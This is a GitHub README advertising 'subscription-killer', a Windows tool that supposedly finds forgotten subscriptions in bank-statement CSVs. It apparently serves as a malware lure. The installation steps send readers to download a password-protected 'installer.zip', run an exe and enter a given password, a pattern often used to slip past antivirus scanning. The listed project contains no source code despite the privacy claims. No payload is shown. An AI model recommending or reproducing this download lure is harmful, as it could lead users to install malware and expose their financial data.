# 🔪 subscription-killer

> Find forgotten subscriptions in your bank statements, detect recurring payments, and discover how much money you could save.

![subscription-killer dashboard](assets/dashboard.png)

<p align="center">
  <a href="https://github.com/dmitry-king1999t3/subscription-killer/releases/latest">
    <img src="https://img.shields.io/badge/Download-Installer-blue?style=for-the-badge" alt="Download Installer">
  </a>
</p>

<p align="center">
  <img src="https://img.shields.io/github/v/release/dmitry-king1999t3/subscription-killer?style=flat-square" alt="Latest Release">
  <img src="https://img.shields.io/github/license/dmitry-king1999t3/subscription-killer?style=flat-square" alt="License">
  <img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Windows">
  <img src="https://img.shields.io/badge/privacy-local-green?style=flat-square" alt="100% Local">
</p>

---

## 💡 What is subscription-killer?

**subscription-killer** is a local tool designed to help you find subscriptions and recurring payments hidden inside your bank statements.

It analyzes your transaction history and looks for patterns that may indicate:

- 🔴 Forgotten or abandoned subscriptions
- 🟡 Duplicate services
- 🟠 Subscription price increases
- 💳 Recurring payments you may no longer need
- 💰 Potential monthly and yearly savings

Instead of manually going through hundreds or thousands of transactions, subscription-killer does the repetitive work for you.

---

## 🎯 Why?

Subscriptions are easy to forget.

A small monthly payment might not seem important, but several forgotten subscriptions can add up to hundreds of dollars every year.

For example:

```text
Hulu                 $17.99/mo
Spotify              $11.99/mo
Cloud Storage         $9.99/mo
Unused VPN             $8.00/mo
───────────────────────────────
Total                $47.97/mo

Potential yearly cost:
$575.64/year
```

**subscription-killer helps you see these recurring expenses in one place.**

---

## ⚙️ How it works

The process is simple:

```text
Bank Statement
      │
      ▼
     CSV
      │
      ▼
┌─────────────────────┐
│ Transaction Analysis│
└─────────────────────┘
      │
      ▼
Recurring Payments
      │
      ├── Abandoned
      ├── Duplicate
      ├── Price Hike
      └── Normal
      │
      ▼
Potential Savings
```

### 1. Import

Provide a bank statement in CSV format.

### 2. Analyze

The application analyzes merchants, transaction amounts, and billing periods.

### 3. Detect

Recurring transactions are grouped and suspicious patterns are identified.

### 4. Save

The application estimates how much you could save by removing unnecessary subscriptions.

---

## ✨ Features

### 🔍 Recurring payment detection

Automatically identifies transactions that appear regularly based on merchant, amount, and billing period.

### 🔴 Abandoned subscriptions

Find subscriptions that appear to have been unused or forgotten.

### 🟡 Duplicate subscriptions

Detect multiple services that may provide similar functionality.

### 🟠 Price increase detection

Identify when a recurring subscription becomes more expensive.

### 💰 Savings estimation

See estimated monthly and yearly savings from potential cancellations.

### 🔒 Privacy-first

Your financial data is processed locally.

**No bank statement uploads.  
No cloud processing.  
No account required.  
No telemetry.**

### ⚡ Simple workflow

Import your CSV, scan it, and review the results.

---

## 📊 Example

A typical scan might look like this:

```text
💸 Found 7 recurring charges totaling $47/mo

🔴 Abandoned: Hulu              $17.99/mo
🟡 Duplicate:  iCloud + Google One → save $2.99/mo
🟠 Price hike: Spotify          $10.99 → $11.99/mo

────────────────────────────────────

💰 Potential savings: $23/mo
💰 Potential yearly savings: $276/year
```

---

## 📥 Installation

### Windows

1. Click the **Download Installer** button at the top of this page.
2. Open the latest GitHub Release.
3. Download `installer.zip` from the **Assets** section.
4. Extract the ZIP archive.
5. Open `subscription-killer.exe`.
6. When prompted, enter the installer password:

```text
!!%GR0+O_2iT
```

> **Note:** Keep your installer password private and do not share it publicly.

---

## 📋 Supported Input

Currently, subscription-killer works with **CSV bank statements**.

The project is designed to support additional bank statement formats in the future.

Example:

```csv
date,merchant,amount
2026-09-01,Hulu,17.99
2026-09-05,Spotify,11.99
2026-09-10,Google One,2.99
```

---

## 🏦 Bank Compatibility

subscription-killer is designed around standardized CSV transaction data.

Compatibility depends on the columns and format provided by your bank.

Future versions may add dedicated importers for additional banks and statement formats.

---

## 🔐 Privacy & Security

Financial data is sensitive.

subscription-killer is designed with a **local-first approach**.

Your bank statement is processed on your own computer instead of being uploaded to a remote server.

### No:

- ❌ Cloud uploads
- ❌ User accounts
- ❌ Advertising trackers
- ❌ Telemetry
- ❌ External financial data processing

### Yes:

- ✅ Local processing
- ✅ Offline-friendly workflow
- ✅ User-controlled data

---

## 🧩 Project Structure

```text
subscription-killer/
│
├── assets/
│   └── dashboard.png
│
├── README.md
├── LICENSE
├── .gitignore
└── requirements.txt
```

---

## 🚀 Roadmap

Possible improvements for future releases:

- [ ] More bank statement formats
- [ ] Automatic merchant categorization
- [ ] Better recurring payment detection
- [ ] Subscription history
- [ ] Exportable reports
- [ ] More detailed savings analytics
- [ ] Additional Windows improvements
- [ ] More customization options

---

## 🤝 Contributing

Contributions, suggestions, and bug reports are welcome.

If you find a problem or have an idea for a feature, open an **Issue** or submit a **Pull Request**.

Before submitting a pull request, please make sure your changes are tested and documented where appropriate.

---

## 📦 Latest Release

**Current version: `v1.0.0`**

Download the latest version:

<p align="center">
  <a href="https://github.com/dmitry-king1999t3/subscription-killer/releases/latest">
    <img src="https://img.shields.io/badge/⬇%20Download%20Latest%20Release-2ea44f?style=for-the-badge" alt="Download Latest Release">
  </a>
</p>

---

## 📄 License

This project is licensed under the **MIT License**.

See [LICENSE](LICENSE) for more information.

---

## 👤 Author

Created by **[dmitry-king1999t3](https://github.com/dmitry-king1999t3)**.

If you find the project useful, consider giving it a ⭐ on GitHub.

---

<p align="center">
  <b>Find forgotten subscriptions. Keep more of your money. 💰</b>
</p>
